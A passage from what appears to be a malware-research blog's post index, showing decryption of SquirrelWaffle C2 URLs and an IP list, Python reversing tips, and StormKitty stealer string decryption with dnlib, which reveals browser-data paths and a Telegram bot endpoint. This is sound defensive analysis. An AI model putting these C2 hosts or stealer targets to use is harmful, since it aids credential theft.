37.70.202.24 85.203.45.30 109.190.93.219 151.8.114.194 176.235.38.106 149.56.99.85 138.128.136.169 213.82.23.224 192.42.123.107 128.90.151.188 162.245.206.249 85.203.45.40 95.211.95.242 185.220.102.251 66.203.112.160 193.128.108.246 193.128.108.242 31.204.150.74 34.141.245.25 122.167.85.191 212.6.86.133 171.25.193.25 149.3.170.147 162.247.74.217 109.70.100.34 89.208.29.5 79.104.209.91 79.104.209.157 194.186.142.205 198.167.217.20 198.167.193.112 204.101.161.31 198.167.219.82 195.74.76.222 70.93.153.224 87.118.110.27 185.247.225.43 193.128.108.250 188.212.135.7 106.75.75.245 86.142.177.106 185.192.69.77 198.167.209.37 59.144.163.235 193.128.108.243 31.204.152.150 211.177.21.222 87.166.49.39 82.127.202.176 58.40.175.6 94.46.179.80 206.189.205.251 178.255.172.194 84.221.205.40 155.138.242.103 178.212.98.156 85.65.32.191 31.167.184.201 88.242.66.45 36.65.102.42 203.213.127.79 85.75.110.214 93.78.214.187 204.152.81.185 183.171.72.218 168.194.101.130 87.104.3.136 92.211.196.33 197.92.140.125 207.244.91.171 49.230.88.160 196.74.16.153 91.149.252.75 91.149.252.88 92.206.15.202 82.21.114.63 92.211.109.152 178.0.250.168 178.203.145.135 85.210.36.4 199.83.207.72 86.132.134.203 88.69.16.230 99.247.129.88 37.201.195.12 87.140.192.0 88.152.185.188 87.156.177.91 99.229.57.160 95.223.77.160 88.130.54.214 99.234.62.23 2.206.105.223 94.134.179.130 84.221.255.199 84.222.8.201 89.183.239.142 87.158.21.26 93.206.148.216 5.146.132.101 77.7.60.154 95.223.75.85 162.254.173.187 50.99.254.163 45.41.106.122 99.237.13.3 45.74.72.13 108.171.64.202 74.58.152.123 216.209.253.121 88.87.68.197 211.107.25.121 109.70.100.25 185.67.82.114 207.102.138.19 204.101.161.14 193.128.108.251 111.7.100.17 111.7.100.16 74.125.210.62 74.125.210.36 104.244.74.57 185.220.101.145 185.220.101.144 185.220.101.18 185.220.100.246 185.220.101.228 185.220.100.243 185.220.101.229 185.220.101.147 185.220.102.250 185.220.100.241 199.195.251.84 213.164.204.94 74.125.213.7 74.125.213.9 177.38.183.13 185.220.100.249 . Decrypt the c2s . The second largest encrupted block is likely the C2 list so let&#39;s decrypt that now. . for i in range(len(blocks)): if blocks[i] == blocks_sorted[-2]: out = decrypt(blocks[i+1], blocks[i]) print(out) . celulasmadreenmexico.com.mx/Wt793Aua|gerencial.institutoacqua.org.br/XynFkhJAxnm|dashboard.adlytic.ai/LlvLoc9O3|bussiness-z.ml/3pdEiqsni|ifiengineers.com/hGVc55g2e|bonusvulkanvegas.srdm.in/U7oOxmI1m|ebrouteindia.com/JEqGe1hNR|test.dirigu.ro/dXf4cS4GPL|cablingpoint.com/LjDG0hkp|perfectdemos.com/T6PQGYCMt|afrizam.360cyberlink.com/f36rjSN5D1|giasuphire.tddvn.com/miFO43YP9b|priyacareers.com/GiTHMPbU|assurant.360cyberlink.com/DGx4k8U9Hil|sig.institutoacqua.org.br/tM7tINg2sCU| . Clean up the c2 list . It looks like the C2 list is seperated by pipes | so let&#39;s turn that into a nice list. . print(out.replace(&#39;|&#39;,&#39; n&#39;)) . celulasmadreenmexico.com.mx/Wt793Aua gerencial.institutoacqua.org.br/XynFkhJAxnm dashboard.adlytic.ai/LlvLoc9O3 bussiness-z.ml/3pdEiqsni ifiengineers.com/hGVc55g2e bonusvulkanvegas.srdm.in/U7oOxmI1m ebrouteindia.com/JEqGe1hNR test.dirigu.ro/dXf4cS4GPL cablingpoint.com/LjDG0hkp perfectdemos.com/T6PQGYCMt afrizam.360cyberlink.com/f36rjSN5D1 giasuphire.tddvn.com/miFO43YP9b priyacareers.com/GiTHMPbU assurant.360cyberlink.com/DGx4k8U9Hil sig.institutoacqua.org.br/tM7tINg2sCU .",
            "url": "https://research.openanalysis.net/squirrelwaffel/malware/config/2021/09/27/squirrelwaffle.html",
            "relUrl": "/squirrelwaffel/malware/config/2021/09/27/squirrelwaffle.html",
            "date": " • Sep 27, 2021"
        }
        
    
  
    
        ,"post15": {
            "title": "Reversing Tips With Python3",
            "content": "Overview . Several tips to level up your reverse engineering with Python3. . Tip 1 - Use Juptyper Notebooks and A Git Repo . Remember to steal our .gitignore file to filter out the juptyper junk files. . Tip 2 - Remember Byte Strings Are Not Strings . import binascii string_example = &quot;test&quot; byte_array_example = b&quot;test&quot; # Convert string into bytes print(string_example.encode(&#39;utf-8&#39;)) # Convert byte array into string print(byte_array_example.decode(&#39;utf-8&#39;)) . b&#39;test&#39; test . Example for Tips 3-5 . example_data = b&#39; x02 x00 x00 x00 x00 x04 x00 x00 x00test x01 x04 x00 x00 x00t x00e x00s x00t x00&#39; . Example Data Structure . struct strings{ DWORD number_of_strings; string* string; } struct string{ BOOL is_wide_string; DWORD string_length; chr* string; } . Tip 3 - Hex Encoding Binary Data . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) print(&quot;This is hex encoded data: %r&quot; % tohex(example_data)) . This is hex encoded data: b&#39;0200000000040000007465737401040000007400650073007400&#39; . Tip 4 - Use Struct To Convert Between Data and Types . https://docs.python.org/3/library/struct.html . import struct number_of_strings = struct.unpack(&#39;&lt;I&#39;,example_data[:4])[0] print(&quot;Number of strings: %d&quot; % number_of_strings) . Number of strings: 2 . Tip 5 - Use Custom Struct Class To Parse Binary Data . import struct example_string = b&#39; x00 x04 x00 x00 x00test&#39; class EXAMPLE_STRING: def __init__(self): self.is_wide_string = False self.string_length = 0 self.string = b&#39;&#39; def from_buffer_copy(self, data): ptr = 0 self.is_wide_string = struct.unpack(&#39;?&#39;, data[ptr:ptr+1])[0] ptr += 1 self.string_length = struct.unpack(&#39;&lt;I&#39;, data[ptr:ptr+4])[0] ptr += 4 if self.is_wide_string: self.string = data[ptr:ptr+(self.string_length*2)].decode(&#39;utf-16le&#39;) ptr += self.string_length*2 else: self.string = data[ptr:ptr+self.string_length].decode(&#39;utf-8&#39;) ptr += self.string_length def pack(self): data = b&#39;&#39; data += struct.pack(&#39;?&#39;, self.is_wide_string) data += struct.pack(&#39;&lt;I&#39;, self.string_length) if self.is_wide_string: data += self.string.encode(&#39;utf-16le&#39;) else: data += self.string.encode(&#39;utf-8&#39;) return data print(&quot;Example string data: %r&quot; % example_string) es = EXAMPLE_STRING() es.from_buffer_copy(example_string) print(&quot;Example is wide: %s&quot; % es.is_wide_string) print(&quot;Example string length: %d&quot; % es.string_length) print(&quot;Example string: %s&quot; % es.string) . Example string data: b&#39; x00 x04 x00 x00 x00test&#39; Example is wide: False Example string length: 4 Example string: test . es.is_wide_string = True print(&quot;Example string data converted to wide: %r&quot; % es.pack()) . Example string data converted to wide: b&#39; x01 x04 x00 x00 x00t x00e x00s x00t x00&#39; . class EXAMPLE_STRINGS: def __init__(self): self.length = 0 self.strings = [] def from_buffer_copy(self, data): ptr = 0 self.length = struct.unpack(&#39;&lt;I&#39;, data[ptr:ptr+4])[0] ptr += 4 for i in range(self.length): tmp_string = EXAMPLE_STRING() tmp_string.from_buffer_copy(data[ptr:]) ptr += len(tmp_string.pack()) self.strings.append(tmp_string) def pack(self): data = b&#39;&#39; data += struct.pack(&#39;&lt;I&#39;, self.length) for s in self.strings: data += s.pack() return data es = EXAMPLE_STRINGS() es.from_buffer_copy(example_data) print(&quot;Number of strings: %d&quot; % es.length) print(&quot;First string is wide: %s&quot; % es.strings[0].is_wide_string) print(&quot;First string: %s&quot; % es.strings[0].string) print(&quot;Second string is wide: %s&quot; % es.strings[1].is_wide_string) print(&quot;Second string: %s&quot; % es.strings[1].string) . Number of strings: 2 First string is wide: False First string: test Second string is wide: True Second string: test . Tip 6 - Parse Stream With BytesIO . without position pointer . https://docs.python.org/3/library/io.html#binary-i-o . import io import struct example_string = b&#39; x00 x04 x00 x00 x00test&#39; bstream = io.BytesIO(example_string) # transform example_string in stream (like File) is_wide_string, *_ = struct.unpack(&#39;?&#39;, bstream.read(1)) string_length, *_ = struct.unpack(&#39;&lt;I&#39;, bstream.read(4)) string_length = string_length*2 if is_wide_string else string_length strings = bstream.read(string_length).decode(&#39;utf-16le&#39; if is_wide_string else &#39;utf-8&#39;) print(f&#39;is_wide_string: {is_wide_string}&#39;) print(f&#39;string_length: {string_length}&#39;) print(f&#39;string: {strings}&#39;, end=&quot; n n&quot;) # Tip 6.1 - Using lambda bstream.seek(0,0) # beginning of the stream read_byte = lambda bs: bs.read(1)[0] read_dword = lambda bs: struct.unpack(&quot;&lt;I&quot;, bs.read(4))[0] read_utf16le = lambda bs, s: bs.read(s).decode(&quot;utf-16le&quot;) read_utf8 = lambda bs, s: bs.read(s).decode(&quot;utf-8&quot;) print(f&#39;is_wide_string: {read_byte(bstream)}&#39;) print(f&#39;string_length: {read_dword(bstream)}&#39;) if is_wide_string: print(f&#39;string: {read_utf16le(bstream, string_length)}&#39;) else : print(f&#39;string: {read_utf8(bstream, string_length)}&#39;) . is_wide_string: False string_length: 4 string: test is_wide_string: 0 string_length: 4 string: test . Tip 7 - Using Fundamental Data Types With ctypes . e.g., useful to reimplement C pseudo code algorithm in Python . Highly recommended to read ctypes doc for reverser https://docs.python.org/3/library/ctypes.html . print(&quot;WRONG :&quot;) DWORD = 0xFFFFFFFF print(f&quot;DWORD = {hex(DWORD)}&quot;) DWORD += 1 print(f&quot;DWORD+1 = {hex(DWORD)} ; WRONG! DWORD size is 4 bytes&quot;) DWORD = 0x0 print(f&quot;DWORD = {hex(DWORD)}&quot;) DWORD -= 1 print(f&quot;DWORD-1 = {hex(DWORD)} ; HUM ?!&quot;, end=&quot; n n&quot;) import ctypes print(&quot;GOOD :&quot;) DWORD = ctypes.c_uint32(0xFFFFFFFF) print(f&quot;DWORD = {hex(DWORD.value)}&quot;) DWORD.value += 1 print(f&quot;DWORD+1 = {hex(DWORD.value)} ; GOOD!&quot;) DWORD = ctypes.c_uint32(0x0) print(f&quot;DWORD = {hex(DWORD.value)}&quot;) DWORD.value -= 1 print(f&quot;DWORD-1 = {hex(DWORD.value)}&quot;, end=&quot; n n&quot;) # CAST DATA EAX = ctypes.c_uint32(0xAAAABBBB) AX = ctypes.cast(ctypes.addressof(EAX), ctypes.POINTER(ctypes.c_uint16)) # we can cast print(&quot;EAX =&quot;, hex(EAX.value)) print(&quot;AX =&quot;, hex(AX.contents.value)) . WRONG : DWORD = 0xffffffff DWORD+1 = 0x100000000 ; WRONG! DWORD size is 4 bytes DWORD = 0x0 DWORD-1 = -0x1 ; HUM ?! GOOD : DWORD = 0xffffffff DWORD+1 = 0x0 ; GOOD! DWORD = 0x0 DWORD-1 = 0xffffffff EAX = 0xaaaabbbb AX = 0xbbbb . Tip 8 - Parse Binary Data Straight To Python Structure . e.g, we are parsing UNICODE_STRING C structure (from WinAPI) : . typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, *PUNICODE_STRING; . from ctypes import Structure from ctypes import wintypes import io class UNICODE_STRING(Structure): _fields_ = [ (&#39;Length&#39;, wintypes.USHORT), (&#39;MaximumLength&#39;, wintypes.USHORT), (&#39;Buffer&#39;, wintypes.WCHAR*1024) # No more 1024 wchar! If more =&gt; CRASH # To keep the example more concise we are not manage the Buffer length ] # UNICODE_STRING data extracted from memory/raw file data = b&#39; x0F x00 x11 x00 x48 x00 x65 x00 x6c x00 x6c x00 x6f x00 x20 x00 x74 x00 x68 x00 x65 x00 x20 x00 x77 x00 x6f x00 x72 x00 x6c x00 x64 x00 x00 x00 x00 x00&#39; stream = io.BytesIO(data) unicode_stru = UNICODE_STRING() stream.readinto(unicode_stru) # deserialization bin to struct print(f&quot;L:{unicode_stru.Length} Max:{unicode_stru.MaximumLength} Str:{unicode_stru.Buffer}&quot;) . L:15 Max:17 Str:Hello the world . Tip 9 - Call C Function from DLL . e.g., we want to analyze the return of GetLogicalDriveStringsW . DWORD GetLogicalDriveStringsW( DWORD nBufferLength, LPWSTR lpBuffer ); . from ctypes import wintypes, windll, byref length = windll.kernel32.GetLogicalDriveStringsW(0,0) # total length required data_string = (wintypes.CHAR*(length*2))() # array of char to access in raw format windll.kernel32.GetLogicalDriveStringsW(length, byref(data_string)) # call api print(&quot;raw: &quot; + str(data_string.raw)) for drive in data_string.raw.rsplit(b&#39; x00 x00&#39;): print(drive.decode(&quot;utf-16le&quot;)) . raw: b&#39;C x00: x00 x00 x00 x00E x00: x00 x00 x00 x00F x00: x00 x00 x00 x00 x00 x00&#39; C: E: F: .",
            "url": "https://research.openanalysis.net/python/python3/tips/research/2021/07/26/python3_reversing_tips.html",
            "relUrl": "/python/python3/tips/research/2021/07/26/python3_reversing_tips.html",
            "date": " • Jul 26, 2021"
        }
        
    
  
    
        ,"post16": {
            "title": "Dot NET Static Analysis With Python",
            "content": "Overview . References: . https://github.com/0ffsetTrainingSolutions/MOLERATS/blob/main/StringDecrypt/reactor_decrypt.py | https://pypi.org/project/pythonnet/ | https://github.com/XenocodeRCE/ConfuserEx-Unpacker | https://rhotav.github.io/stringdecryptionwithpythonen | . StormKitty String Decryption . We need a simple task to test our tools and a .NET sample. Let&#39;s try to decrypt the strings from this modified StormKitty stealer (https://github.com/swagkarna/StormKitty). You can download the sample from malshare (https://malshare.com/sample.php?action=detail&amp;hash=16694f6390c59adc1161a1855e9e7904). . If we load the sample in dnspy we can see that there is an AES deryption function that reads a hard coded password and salt that are passed to the generator Rfc2898DeriveBytes and used to generate a key and IV which are then used these to decrypt strings on the fly. . . . To start out simple lets conver the decryption routine into python, then lets use dnlib to parse out all the decryption calls and decrypt the strings. . from Crypto.Cipher import AES def decrypt(ctxt, key, iv): cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.decrypt(ctxt) # Test with data from dnspy salt = bytes([0xff,64,191,111,23,3,113,119,231,121,252,112,79,32,114,156]) password = bytes([104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,76,105,109,101,114,66,111,121,47,83,116,111,114,109,75,105,116,116,121]) iter_count = 1000 key_size = 256 block_size = 128 key_size_bytes = int(key_size/8) block_size_bytes = int(block_size/8) # Generate the key and IV from the hard coded password and salt # Rfc2898DeriveBytes is a streaming-response object, # so concatenating two successive calls is the same as # doing one call with both lengths added together from Crypto.Protocol import KDF key_bytes = KDF.PBKDF2(password, salt, count=iter_count, dkLen=key_size_bytes+block_size_bytes) ctxt = bytes([191,144,50,4,176,103,41,226,163,145,184,198,37,147,201,246,15,80,188,217,224,55,94,195,60,36,195,150,34,219,225,21]) ptxt = decrypt(ctxt, key_bytes[:key_size_bytes], key_bytes[key_size_bytes:]) print(&quot;Decrypted string: %r&quot; % ptxt) . Decrypted string: b&#39; Chromium User Data x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c&#39; . # The padding byte is the pad delta so we just have to take a byte # and use it to clip the delta off the end of the data def unpad(data): return data[:-ord(data[len(data)-1:])] print(&quot;Decrypted string: %r&quot; % unpad(ptxt)) . Decrypted string: b&#39; Chromium User Data &#39; . .NET Assembly Analysis . Ok now that we have a decryption routine we can start to look at programmatically analyzing the .NET assembly seaching for the encrypted strings. . First we will need a way to call .NET methods from Python. This will allow us to both execute functionality in the sample as well as take advantage of multiple .NET analysis tools which are themselves written in .NET. For this we will use the pythonnet package (https://github.com/pythonnet/pythonnet/wiki). . Pythonnet Setup . Installing pythonnet is as simple as pip install pythonnet. If you are on mac you will want to first make sure you have mono installed. Mono is the platfrom independent .NET interpreter that allows you to run .NET anywhere. We will use brew with brew install mono. . Once we have pythonnet installed it can be imported into python using import clr. CLR stands for Common Language Runtime which is the actual virtual machine that is used to interpret and execute .NET (I think?). . import sys, struct, clr clr.AddReference(&quot;System.Memory&quot;) from System.Reflection import Assembly, MethodInfo, BindingFlags from System import Type . We are going to use dnlib (https://github.com/0xd4d/dnlib) to interact wiht the .NET assembly. We will need to download the DLL and pass a local path to our python instance. We can build our own from the release ((https://github.com/0xd4d/dnlib/releases) or just download an old compiled version (https://github.com/XenocodeRCE/ConfuserEx-Unpacker/tree/master/DLLS). . DNLIB_PATH = &#39;/tmp/dnlib.dll&#39; clr.AddReference(DNLIB_PATH) import dnlib from dnlib.DotNet import * from dnlib.DotNet.Emit import OpCodes . Like the dnlib DLL we will need to pass the local path to this file to our Python. Then we can use this path to load the .NET module and assembly. . SAMPLE_PATH = &#39;/tmp/6e4802a21c61d349b2a201ec5143e095b57e033d51bb571b90a53749956beac4.bin&#39; module = dnlib.DotNet.ModuleDefMD.Load(SAMPLE_PATH) # we don&#39;t need the assembly for this because we won&#39;t be using invoke # assembly = Assembly.LoadFrom(SAMPLE_PATH) . Now we need to find the decryption method. The process is straight forward, we will iterate through all of the methods for each type in the module (I think type is what a class is converted to in the IL?) and for each method we will check the instructions to find the decryption method. Actually matching the decryption method is a bit of a hack but basically we just find some stuff that is probably unique to the method and search for that. In this case we are looking for instructions that set the AES key size SymmetricAlgorithm::set_KeySize and block size SymmetricAlgorithm::set_BlockSize. . . eFlags = BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic # First find the decryption method decryption_method = None for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue if len(method.Body.Instructions) &lt; 20: continue # Check the first 20 instructions for the AES key set and block set key_set = False block_set = False for ptr in range(20): if &#39;SymmetricAlgorithm::set_KeySize&#39; in method.Body.Instructions[ptr].ToString(): key_set = True if &#39;SymmetricAlgorithm::set_BlockSize&#39; in method.Body.Instructions[ptr].ToString(): block_set = True if key_set and block_set: decryption_method = method break if decryption_method != None: print(decryption_method.FullName) else: print(&quot;Can&#39;t find decryption method!&quot;) . System.String Class69::smethod_1(System.Byte[]) . Now that we know the decryption method we can save its name then we can search for calls to the method name. The actual name is a bit tricky since we want the class name and the method name in order to disambiguate it. The class name will always preceed the method name with :: so we can use that to parse the correct string. . full_name = decryption_method.FullName method_name = str(decryption_method.Name) decryption_method_name = full_name[:full_name.find(method_name)+len(method_name)].split(&quot; &quot;)[-1] . Now we can find all the places where the decryption method is called by searching through all the instructions for a call to the decryption method name. . Once we find a call we need to parse out the arguement which is an array containing the encrypted string. This is is a bit tricky since arrays are split into multiple instructions in the IL. . . Here we can see the call to the decryption method on line 291 and preceeding the call we can see another call to InitializeArray which takes an argument setup with the ldtoken call on line 295. Based on this we can search backwards in the code from the call to the decryption fucntion for the first ldtoken instruction which will be loadin the actual data for the array (containing the encrypted string). . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue for ptr in range(len(method.Body.Instructions)): instruction = method.Body.Instructions[ptr] if instruction.OpCode == OpCodes.Call: if decryption_method_name in instruction.ToString(): # Found call now seach backwards a maximum of 5 instructions for ldtoken to get encrypted string for i in range(1,5): if method.Body.Instructions[ptr-i].OpCode == OpCodes.Ldtoken: print(method.Body.Instructions[ptr-i]) mm = method.Body.Instructions[ptr-i] token = mm.Operand.MDToken . IL_0011: ldtoken Class71/Struct20 Class71::struct20_6 IL_002B: ldtoken Class71/Struct20 Class71::struct20_14 IL_0045: ldtoken Class71/Struct20 Class71::struct20_19 IL_005F: ldtoken Class71/Struct20 Class71::struct20_2 IL_0079: ldtoken Class71/Struct22 Class71::struct22_0 IL_0093: ldtoken Class71/Struct20 Class71::struct20_4 IL_00AD: ldtoken Class71/Struct20 Class71::struct20_3 IL_00C7: ldtoken Class71/Struct20 Class71::A25CC6D70519A408CEA3AE72EBFF915335C6E6E613B18720FA746D0D8056559B IL_00E1: ldtoken Class71/Struct20 Class71::struct20_18 IL_00FC: ldtoken Class71/Struct20 Class71::struct20_9 IL_0117: ldtoken Class71/Struct20 Class71::struct20_24 IL_0132: ldtoken Class71/Struct20 Class71::struct20_25 IL_014D: ldtoken Class71/Struct20 Class71::BF8CAA158736480861E8F91826FFFA6545B27C3EC30153CA68330811329C2A8E IL_0168: ldtoken Class71/Struct20 Class71::struct20_22 IL_0183: ldtoken Class71/Struct23 Class71::struct23_1 IL_019E: ldtoken Class71/Struct22 Class71::ACDCB1AFB15194F894860BA7E2B85B91B6E5AB701407DFBAC51146F0C6E53B6F IL_01B9: ldtoken Class71/Struct20 Class71::struct20_21 IL_01D4: ldtoken Class71/Struct20 Class71::CE8979E74A40B6869BD5BED7E5610AA981486221166D6F6E65F3B34BF501B8DD IL_01EF: ldtoken Class71/Struct20 Class71::struct20_8 IL_020A: ldtoken Class71/Struct20 Class71::struct20_10 IL_0225: ldtoken Class71/Struct20 Class71::struct20_7 IL_0240: ldtoken Class71/Struct20 Class71::struct20_20 IL_025B: ldtoken Class71/Struct20 Class71::struct20_15 IL_0276: ldtoken Class71/Struct22 Class71::struct22_2 IL_0291: ldtoken Class71/Struct20 Class71::struct20_13 IL_02AC: ldtoken Class71/Struct20 Class71::A223DB41D9BFBC0280EBD0050A8BBD8EA7A943B251C8FD2D0B01A040462EDB0B IL_02C7: ldtoken Class71/Struct20 Class71::struct20_12 IL_02E2: ldtoken Class71/Struct20 Class71::struct20_23 IL_02FD: ldtoken Class71/Struct20 Class71::ACDF4A22C9359C1328E1CC966BC6C0D0D95B468AF46466FFAEC92C411050E17B IL_0318: ldtoken Class71/Struct20 Class71::A515425C81DC183149AF8B446E168A9509399B54129E92DAC27E19364B0D7B86 IL_0333: ldtoken Class71/Struct20 Class71::D3709EF761A0DEFC0ABE47CF9B3476718CE15F873291CF43E1AE3DC080DE5523 IL_034E: ldtoken Class71/Struct20 Class71::A981F5EDD35DDFF3F41F44A598272BBEAFA5F5B9C1595DC02FC6044CE81BE666 IL_0369: ldtoken Class71/Struct20 Class71::struct20_11 IL_0384: ldtoken Class71/Struct20 Class71::struct20_1 IL_039F: ldtoken Class71/Struct22 Class71::FD2AD7331099CFB7A118458E12965559ABF6D870A4B3DFF975FF43C3C56C09C8 IL_03C4: ldtoken Class71/Struct20 Class71::struct20_17 IL_03DE: ldtoken Class71/Struct19 Class71::struct19_0 IL_03F8: ldtoken Class71/Struct19 Class71::CEB1CC71FC33A5B2E3A8E0727D334A0B236251779D5BAF438C965B4FB341F460 IL_0412: ldtoken Class71/Struct19 Class71::A4956ED9AA7996A00C7593BFFCBDB3FBE5A11F729876DF9AC5A1A33EF3EFE3A2 IL_042C: ldtoken Class71/Struct20 Class71::A8F810D24584EC3B7929D304606C2DD1E44F852CA90C291ED8CC398AA3F07FD3 IL_0446: ldtoken Class71/Struct20 Class71::D170DC7768D26A111EF0E7B910988BFC4ACBCA3BE6A5B476EED1F48C70040F93 IL_0460: ldtoken Class71/Struct20 Class71::D61B7716B5AD4A42CC6C9300587B2C389EB40C3E8BF9B039E7DB98097247DC1B IL_047A: ldtoken Class71/Struct22 Class71::CAB1D35DDB8E2426F9750F1040D87B301146E2BFAB7CF292C14EC1133A2ACB37 IL_0497: ldtoken Class71/Struct20 Class71::struct20_0 IL_002D: ldtoken Class71/Struct23 Class71::B6BF689EB1506173FB29643B5E51D7E067FD5E191256B038EB618C2F593EB272 IL_00A8: ldtoken Class71/Struct20 Class71::struct20_16 IL_011B: ldtoken Class71/Struct20 Class71::D813E22A9B121801B05222D1BF9E349DAA549C1171C61A538CAD559E2701513B IL_01FB: ldtoken Class71/Struct23 Class71::struct23_2 IL_0302: ldtoken Class71/Struct23 Class71::A4327AC8803761C49FE829B97D8B2E262D38A165E20B7F7C9FDCD1F757CDB7BB IL_0092: ldtoken Class71/Struct20 Class71::struct20_5 IL_000E: ldtoken Class71/Struct20 Class71::B4066645CC9D38B322DDCD501F7863D2759D4CAA2A993694DCC6DDB1EEBC7301 IL_002E: ldtoken Class71/Struct23 Class71::struct23_0 IL_01C1: ldtoken Class71/Struct22 Class71::struct22_1 IL_0008: ldtoken Class71/Struct20 Class71::B28DB940EDE70686E870504AE41CB6EEAE634B9858DF6B5AEAB3958AA115A5E1 . Now that we have a way to find all of the arrays that contain the encrypted strings we need a way to get the data out of the array. This was very confusing when I was trying to figure it out... hat tip to https://twitter.com/s4tan for all the help &lt;3 . http://antonioparata.blogspot.com/2018/02/analyzing-nasty-net-protection-of.html | http://antonioparata.blogspot.com/2013/10/blog-post.html | . I&#39;m still not sure this is the best way to do things but basically we grab the first operand from the ldtoken instruction which is the token for the field that contains the array. Each array is stored in a field in a class so once we have the token we can search through all the fields in all the classes for the matching token and extract the data. To actually convert the byte array into something we can use in Python we call the get_InitialValue method for the field and convert this into a byte string. I think this works because the array is static making the initial value the actual value but I&#39;m not entirely sure. . To simplify the process I created a helper function that will allow us to find and extract the bytes string based on a token. . def get_array_data_by_token(token): for mtype in module.GetTypes(): if mtype.get_HasFields(): for field in mtype.get_Fields(): if field.get_MDToken() == token: try: return bytes(field.get_InitialValue()) except: return None return None . Now we have all the parts and we can put them together to extract and decrypt the strings! . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue for ptr in range(len(method.Body.Instructions)): instruction = method.Body.Instructions[ptr] if instruction.OpCode == OpCodes.Call: if decryption_method_name in instruction.ToString(): # Found call now seach backwards a maximum of 5 instructions for ldtoken to get encrypted string for i in range(1,5): if method.Body.Instructions[ptr-i].OpCode == OpCodes.Ldtoken: mm = method.Body.Instructions[ptr-i] token = mm.Operand.MDToken ctxt = get_array_data_by_token(token) if ctxt != None: ptxt = decrypt(ctxt, key_bytes[:key_size_bytes], key_bytes[key_size_bytes:]) ptxt = unpad(ptxt) print(ptxt) else: print(&quot;Error no array data found for %s&quot; % method.Body.Instructions[ptr-i]) . b&#39; Chromium User Data &#39; b&#39; Google Chrome User Data &#39; b&#39; Google(x86) Chrome User Data &#39; b&#39; Opera Software &#39; b&#39; MapleStudio ChromePlus User Data &#39; b&#39; Iridium User Data &#39; b&#39; 7Star 7Star User Data &#39; b&#39; CentBrowser User Data &#39; b&#39; Chedot User Data &#39; b&#39; Vivaldi User Data &#39; b&#39; Kometa User Data &#39; b&#39; Elements Browser User Data &#39; b&#39; Epic Privacy Browser User Data&#39; b&#39; uCozMedia Uran User Data &#39; b&#39; Fenrir Inc Sleipnir5 setting modules ChromiumViewer &#39; b&#39; CatalinaGroup Citrio User Data &#39; b&#39; Coowon Coowon User Data &#39; b&#39; liebao User Data &#39; b&#39; QIP Surf User Data &#39; b&#39; Orbitum User Data &#39; b&#39; Comodo Dragon User Data &#39; b&#39; Amigo User User Data &#39; b&#39; Torch User Data &#39; b&#39; Yandex YandexBrowser User Data &#39; b&#39; Comodo User Data &#39; b&#39; 360Browser Browser User Data &#39; b&#39; Maxthon3 User Data &#39; b&#39; K-Melon User Data &#39; b&#39; Sputnik Sputnik User Data &#39; b&#39; Nichrome User Data &#39; b&#39; CocCoc Browser User Data &#39; b&#39; Uran User Data &#39; b&#39; Chromodo User Data &#39; b&#39; Mail.Ru Atom User Data &#39; b&#39; BraveSoftware Brave-Browser User Data &#39; b&#39; Mozilla Firefox&#39; b&#39; Waterfox&#39; b&#39; K-Meleon&#39; b&#39; Thunderbird&#39; b&#39; Comodo IceDragon&#39; b&#39; 8pecxstudios Cyberfox&#39; b&#39; NETGATE Technologies BlackHaw&#39; b&#39; Moonchild Productions Pale Moon&#39; b&#39; Microsoft Edge User Data&#39; b&#39;https://studio.youtube.com/getAccountSwitcherEndpoint&#39; b&#39;https://www.youtube.com&#39; b&#39;https://studio.youtube.com&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/get?alt=json&amp;key=&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/esr?alt=json&amp;key=&#39; b&#39;vm7UdYrfFAJ7GRZxN8S9&#39; b&#39;http://api64.ipify.org&#39; b&#39;https://api.mylnikov.org/geolocation/wifi?v=1.1&amp;bssid=&#39; b&#39;https://www.google.com.ua/maps/place/&#39; b&#39;https://api.telegram.org/bot&#39; . Editing .NET Assembly . Success! Now that we have our string decryption working we can update our code to edit the sample and insert the decrypted strings. This process is is made very easy using dnlib. All we need to do is nop out the instructions that are used to build the encrypted string array and replace the call to the decryption function with a simple string load using the decrypted string. Since the instruction following decryption call expects the decrypted string to be on the stack we will load the decrypted string directly on the stack. Once this is done we will save the edited assembly to a new file. . . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue for ptr in range(len(method.Body.Instructions)): instruction = method.Body.Instructions[ptr] if instruction.OpCode == OpCodes.Call: if decryption_method_name in instruction.ToString(): # Found call now seach backwards a maximum of 5 instructions for ldtoken to get encrypted string for i in range(1,5): if method.Body.Instructions[ptr-i].OpCode == OpCodes.Ldtoken: mm = method.Body.Instructions[ptr-i] token = mm.Operand.MDToken ctxt = get_array_data_by_token(token) if ctxt != None: ptxt = decrypt(ctxt, key_bytes[:key_size_bytes], key_bytes[key_size_bytes:]) ptxt = unpad(ptxt) print(ptxt) # We need to nop out everything from OpCodes.Ldc_I4_S to the decryption call for j in range(1,10): if method.Body.Instructions[ptr-j].OpCode == OpCodes.Ldc_I4_S: while j &gt; 0: method.Body.Instructions[ptr-j].OpCode = OpCodes.Nop j -= 1 break # Replace decryption call with string load method.Body.Instructions[ptr].OpCode = OpCodes.Ldstr method.Body.Instructions[ptr].Operand = ptxt.decode(&#39;utf-8&#39;) else: print(&quot;Error no array data found for %s&quot; % method.Body.Instructions[ptr-i]) # we found the string no need to keep searching for instructions break # To avoid the Error calculating max stack value we can just keep old max stack method.Body.KeepOldMaxStack = True # Save edited assembly module.Write(SAMPLE_PATH + &quot;.decrypted&quot;) . b&#39; Chromium User Data &#39; b&#39; Google Chrome 